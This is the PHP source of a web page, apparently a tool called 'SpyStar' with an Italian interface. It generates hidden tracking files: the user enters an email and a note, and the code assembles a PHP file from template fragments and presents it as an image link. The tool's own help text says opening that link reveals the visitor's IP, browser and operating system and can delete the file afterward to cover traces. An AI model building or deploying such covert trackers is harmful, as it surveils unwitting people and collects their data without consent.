<?php  
include 'conf.php';
echo "<a href='index.php'>Home</a> | <a href='http://systemoverflow.altervista.org'>About</a> |".giorno()." | ".$_SERVER['REMOTE_ADDR'];;
?>
<html>
<body><center><br><br><br><br><br><br><br>
<script type="text/javascript">
function Help()
{
alert("Privacy: Elimina il file una volta aperto \n IP: Ricevi l'indirizzo ip \n Browser: scopri che browser usa \n OS: scopri che sistema operativo utilizza");
}
</script>
<form name="cp" method="POST" action="index.php">
<div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); width: 850px; padding: 5px 5px 5px 15px; -moz-border-radius: 20px 20px 20px 20px;">
<img src="img/star.png" \><br>
Mail:<input type="text" name="mail" size=30 px><br>
<textarea name="nota" cols=40 rows=5 maxlength=100>Qui puoi inserire una nota(optional)</textarea><br>
Privacy<input type="checkbox" name="privacy"> 	IP 	<input type="checkbox" name="IP"> <br>
Browser<input type="checkbox" name="Brow"> 		OS 	<input type="checkbox" name="OSS"> <br>
<input type="submit" name="ok" value="Make"> <input type="button" value="Help" onclick="Help()" />


<?php
$mail = htmlentities($_POST['mail']);
$ip = $_SERVER['REMOTE_ADDR'];
$percorso = "output/".rand(9999,100000).".php"; 

if ($_POST['ok'] == 'Make' && strlen($mail) >= 4)
{

	if(strpos($mail,"@") !=0)
	{
$var=fopen("body/1.txt","r");
$var2=fread($var,99999);
$identificatore = fopen($percorso, "w");
fwrite($identificatore, $var2);
fclose($identificatore);


$identificatore = fopen($percorso, "a");
fwrite($identificatore, $ip.'";');
fclose($identificatore);


$var=fopen("body/2.txt","r");
$var2=fread($var,99999);
$identificatore = fopen($percorso, "a");
fwrite($identificatore, $var2);
fclose($identificatore);


$identificatore = fopen($percorso, "a");
fwrite($identificatore, $mail. '";');
fclose($identificatore);


$var=fopen("body/3.txt","r");
$var2=fread($var,99999);
$identificatore = fopen($percorso, "a");
fwrite($identificatore, $var2);
fclose($identificatore);

if($_POST['IP'] == 'on')
{
$var=fopen("body/ip.txt","r");
$var2=fread($var,99999);
$identificatore = fopen($percorso, "a");
fwrite($identificatore, $var2);
fclose($identificatore);
}

if($_POST['Brow'] == 'on')
{
$var=fopen("body/browser.txt","r");
$var2=fread($var,99999);
$identificatore = fopen($percorso, "a");
fwrite($identificatore, $var2);
fclose($identificatore);
}

if($_POST['OSS'] == 'on')
{
$var=fopen("body/os.txt","r");
$var2=fread($var,99999);
$identificatore = fopen($percorso, "a");
fwrite($identificatore, $var2);
fclose($identificatore);
}


if(htmlentities($_POST['nota']) != 'Qui puoi inserire una nota(optional)')
{
$var=fopen("body/nota.txt","r");
$var2=fread($var,99999);
$identificatore = fopen($percorso, "a");
fwrite($identificatore, $var2);
fclose($identificatore);

$identificatore = fopen($percorso, "a");
fwrite($identificatore, '"'.htmlentities($_POST['nota']).' \n";');
fclose($identificatore);
}


$var=fopen("body/4.txt","r");
$var2=fread($var,99999);
$identificatore = fopen($percorso, "a");
fwrite($identificatore, $var2);
fclose($identificatore);

if($_POST['privacy'] == 'on')
{
$identificatore = fopen($percorso, "a");
fwrite($identificatore, 'unlink("'.substr($percorso,7,strlen($percorso)).'");');
fclose($identificatore);
}


$var=fopen("body/5.txt","r");
$var2=fread($var,99999);
$identificatore = fopen($percorso, "a");
fwrite($identificatore, $var2);
fclose($identificatore);


echo "<center>Copy(ctrl+c): <img src='http://".$_SERVER['SERVER_NAME']."/SpyStar/".$percorso."'></img></center>";
	}
	else
	{
		echo "<center>Errore:Indirizzo email errato</center>";
	}
}
?>

</div>
</form></center>
</body>
</html>
